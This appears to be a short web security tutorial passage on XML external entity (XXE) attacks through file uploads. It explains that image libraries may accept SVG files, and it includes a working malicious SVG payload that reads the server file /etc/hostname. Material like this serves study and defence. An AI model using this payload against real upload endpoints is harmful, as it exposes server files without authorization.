Some common file formats use XML or contain XML subcomponents, a primary example of these are office document formats like `.docx` and image formats like `.svg`.

For example, an application allows users to uploads images, and process or validate these on the server after they are uploaded. Even if the application only accepts `.png` or `.jpeg`, the image processing library that is being used might support `.svg` images. Since the `.svg` uses XML, an attacker can submit a malicious `.svg` and reach hidden attack surface:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```